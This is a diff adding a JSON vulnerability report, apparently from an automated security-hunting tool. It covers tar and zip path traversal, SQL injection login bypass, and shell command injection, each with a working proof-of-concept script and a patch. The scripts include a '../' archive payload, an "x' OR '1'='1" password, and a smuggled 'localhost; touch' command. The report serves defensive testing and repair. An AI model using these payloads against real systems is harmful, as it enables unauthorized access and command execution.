@@ -1,0 +1,103 @@
+{
+  "validator_verdict": "confirmed",
+  "hunts": {
+    "src/data-isolation-and-lifecycle": [
+      {
+        "id": "cve-2007-4559",
+        "verdict": "needs_validation",
+        "title": "Directory traversal via tarfile.extractall (CVE-2007-4559)",
+        "attack_class": "data-isolation-and-lifecycle",
+        "severity": "high",
+        "threat_model": {
+          "attacker": "attacker who supplies the tar archive",
+          "boundary": "archive member path escapes the extraction directory"
+        },
+        "location": {
+          "file": "src/extract.py",
+          "line": 11,
+          "symbol": "extract"
+        },
+        "description": "extract() calls tarfile.extractall without validating member names, so '../' members write outside dest.",
+        "poc": {
+          "kind": "script",
+          "content": "import io, os, tarfile, tempfile, importlib.util\ns = importlib.util.spec_from_file_location('extract', 'src/extract.py')\nm = importlib.util.module_from_spec(s); s.loader.exec_module(m)\nwork = tempfile.mkdtemp(); dest = os.path.join(work, 'out'); os.makedirs(dest)\ntarp = os.path.join(work, 'mal.tar')\nwith tarfile.open(tarp, 'w') as tf:\n    data = b'owned'\n    info = tarfile.TarInfo('../pwned.txt'); info.size = len(data)\n    tf.addfile(info, io.BytesIO(data))\ntry:\n    m.extract(tarp, dest)\nexcept Exception:\n    pass\nassert os.path.exists(os.path.join(work, 'pwned.txt')), 'no escape'\nprint('TRAVERSAL_OK')\n",
+          "observed": "TRAVERSAL_OK"
+        },
+        "patch": "-        tf.extractall(dest)\n+        for member in tf.getmembers():\n+            resolved = os.path.realpath(os.path.join(dest, member.name))\n+            if not resolved.startswith(os.path.realpath(dest) + os.sep):\n+                raise Exception('unsafe path in tar: ' + member.name)\n+        tf.extractall(dest)"
+      },
+      {
+        "id": "zip-slip",
+        "verdict": "needs_validation",
+        "title": "Zip Slip path traversal in unzip (CWE-22)",
+        "attack_class": "data-isolation-and-lifecycle",
+        "severity": "high",
+        "threat_model": {
+          "attacker": "attacker who supplies the zip archive",
+          "boundary": "archive entry path escapes the extraction directory"
+        },
+        "location": {
+          "file": "src/unzip.py",
+          "line": 14,
+          "symbol": "unzip"
+        },
+        "description": "unzip() joins the entry name onto dest without checking the resolved path, so '../' entries escape.",
+        "poc": {
+          "kind": "script",
+          "content": "import os, zipfile, tempfile, importlib.util\ns = importlib.util.spec_from_file_location('unzip', 'src/unzip.py')\nm = importlib.util.module_from_spec(s); s.loader.exec_module(m)\nwork = tempfile.mkdtemp(); dest = os.path.join(work, 'out'); os.makedirs(dest)\nzp = os.path.join(work, 'mal.zip')\nwith zipfile.ZipFile(zp, 'w') as zf:\n    zf.writestr('../pwned.txt', b'owned')\ntry:\n    m.unzip(zp, dest)\nexcept Exception:\n    pass\nassert os.path.exists(os.path.join(work, 'pwned.txt')), 'no escape'\nprint('ZIPSLIP_OK')\n",
+          "observed": "ZIPSLIP_OK"
+        },
+        "patch": "-            target = os.path.join(dest, name)\n+            target = os.path.join(dest, name)\n+            if not os.path.realpath(target).startswith(os.path.realpath(dest) + os.sep):\n+                raise Exception('zip slip: ' + name)"
+      }
+    ],
+    "src/web-protocol-and-auth": [
+      {
+        "id": "sqli",
+        "verdict": "needs_validation",
+        "title": "SQL injection auth bypass in login (CWE-89)",
+        "attack_class": "web-protocol-and-auth",
+        "severity": "critical",
+        "threat_model": {
+          "attacker": "unauthenticated remote user controlling username/password",
+          "boundary": "input crosses into SQL and bypasses authentication"
+        },
+        "location": {
+          "file": "src/auth.py",
+          "line": 14,
+          "symbol": "login"
+        },
+        "description": "login() builds the SQL by string formatting, so a crafted password makes the WHERE clause always true.",
+        "poc": {
+          "kind": "script",
+          "content": "import os, sqlite3, tempfile, importlib.util\ns = importlib.util.spec_from_file_location('auth', 'src/auth.py')\nm = importlib.util.module_from_spec(s); s.loader.exec_module(m)\nwork = tempfile.mkdtemp(); db = os.path.join(work, 'app.db')\ncon = sqlite3.connect(db)\ncon.execute('CREATE TABLE users(id INTEGER, name TEXT, password TEXT)')\ncon.execute(\"INSERT INTO users VALUES (1, 'admin', 's3cret')\"); con.commit(); con.close()\nok = m.login(db, 'admin', \"x' OR '1'='1\")\nassert ok is True, 'no bypass'\nprint('SQLI_OK')\n",
+          "observed": "SQLI_OK"
+        },
+        "patch": "-    query = \"SELECT id FROM users WHERE name = '%s' AND password = '%s'\" % (username, password)\n-    row = cur.execute(query).fetchone()\n+    row = cur.execute(\"SELECT id FROM users WHERE name = ? AND password = ?\", (username, password)).fetchone()"
+      }
+    ],
+    "src/cloud-and-deployment": [
+      {
+        "id": "cmd-injection",
+        "verdict": "needs_validation",
+        "title": "OS command injection in ping (CWE-78)",
+        "attack_class": "cloud-and-deployment",
+        "severity": "critical",
+        "threat_model": {
+          "attacker": "user controlling the host argument",
+          "boundary": "input crosses into a shell command line"
+        },
+        "location": {
+          "file": "src/net.py",
+          "line": 11,
+          "symbol": "ping"
+        },
+        "description": "ping() interpolates host into a shell=True command, so '; <cmd>' runs arbitrary commands.",
+        "poc": {
+          "kind": "script",
+          "content": "import os, tempfile, importlib.util\ns = importlib.util.spec_from_file_location('net', 'src/net.py')\nm = importlib.util.module_from_spec(s); s.loader.exec_module(m)\nwork = tempfile.mkdtemp(); marker = os.path.join(work, 'pwned')\nm.ping('localhost; touch ' + marker)\nassert os.path.exists(marker), 'no injection'\nprint('CMDI_OK')\n",
+          "observed": "CMDI_OK"
+        },
+        "patch": "-    cmd = \"ping -c 1 \" + host\n-    return subprocess.run(cmd, shell=True, capture_output=True).returncode\n+    return subprocess.run([\"ping\", \"-c\", \"1\", host], capture_output=True).returncode"
+      }
+    ]
+  }
+}
